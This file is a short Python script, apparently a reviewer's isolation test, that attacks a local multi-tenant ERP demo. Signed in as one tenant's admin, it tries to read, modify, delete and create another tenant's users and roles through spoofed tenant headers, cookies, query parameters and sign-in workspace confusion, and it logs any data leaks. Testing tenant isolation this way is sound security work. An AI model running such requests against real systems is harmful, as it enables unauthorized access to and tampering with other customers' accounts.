# Critic's own tenant A -> tenant B HTTP attack against the running demo (port 20050).
import json, urllib.request, http.cookiejar, sys
BASE="http://localhost:20050"
B_TENANT="0190a000-0000-7000-8000-000000000002"
ids=[l.split('|') for l in open(sys.argv[1]).read().split()]
B_IDS=[i for _,i in ids if '-' in i]+[B_TENANT]
B_MARKERS=set(B_IDS)|{"gulfsteel","Gulf Steel","admin@gulfsteel.example"}
def req(method, path, body=None, token=None, headers=None):
    h={"Content-Type":"application/json","X-Erp-Request":"1"}
    if token: h["Authorization"]="Bearer "+token
    h.update(headers or {})
    data=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(BASE+path, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r) as resp: return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e: return e.code, e.read().decode()
s,b=req("POST","/api/auth/sign-in",{"email":"admin@alnoor.example","password":"Demo-Pass-2026","issueToken":True})
tok=json.loads(b)["token"]; print("signed in A:",s)
leaks=[];count=0;statuses={}
hdrs=[{},{"X-Tenant-Id":B_TENANT,"X-Tenant":"gulfsteel","X-Forwarded-Host":"gulfsteel.example","Cookie":"erp_tenant="+B_TENANT}]
qs=["","?tenantId=%s&tenant=gulfsteel&workspace=gulfsteel&companyId=%s"%(B_TENANT,B_TENANT)]
for bid in B_IDS:
  for h in hdrs:
    for q in qs:
      for m,p,body in [("GET","/api/identity/users/%s"%bid,None),("GET","/api/identity/roles/%s"%bid,None),
                       ("PUT","/api/identity/users/%s"%bid,{"displayName":"pwned","language":"en","isActive":False,"roleIds":[],"version":1}),
                       ("PUT","/api/identity/roles/%s"%bid,{"nameEn":"pwned","nameAr":"x","permissions":[],"version":1}),
                       ("DELETE","/api/identity/roles/%s"%bid,None),
                       ("POST","/api/identity/users",{"email":"x%d@alnoor.example"%count,"displayName":"x","language":"en","password":"Attack-Password-1!","roleIds":[bid],"tenantId":B_TENANT}),
                       ("GET","/api/identity/users?search=gulfsteel",None),("GET","/api/identity/roles",None),("GET","/api/tenancy/tenant",None),
                       ("PUT","/api/tenancy/tenant",{"nameEn":"Al Noor Trading LLC","nameAr":"شركة النور للتجارة ذ.م.م","version":0,"tenantId":B_TENANT,"id":B_TENANT})]:
        s,b=req(m,p+q,body,tok,h); count+=1
        statuses[(m,p.split('/')[3] if len(p.split('/'))>3 else p,s)]=statuses.get((m,p.split('/')[3] if len(p.split('/'))>3 else p,s),0)+1
        for mk in B_MARKERS:
          if mk in b: leaks.append((m,p+q,h,s,mk))
# token of B used with A's cookie? sign in as B admin then try header confusion
s,b=req("POST","/api/auth/sign-in",{"email":"admin@alnoor.example","password":"Demo-Pass-2026","workspace":"gulfsteel","issueToken":True}); print("A email + workspace=gulfsteel:",s,b[:120])
s,b=req("POST","/api/auth/sign-in",{"email":"admin@gulfsteel.example","password":"Demo-Pass-2026","workspace":"alnoor"}); print("B email + workspace=alnoor:",s, "tenant" in b and json.loads(b).get("tenant",{}).get("code"))
print("requests:",count,"leaks:",len(leaks))
for l in leaks[:20]: print("LEAK",l)
for k,v in sorted(statuses.items(), key=str): print(k,v)
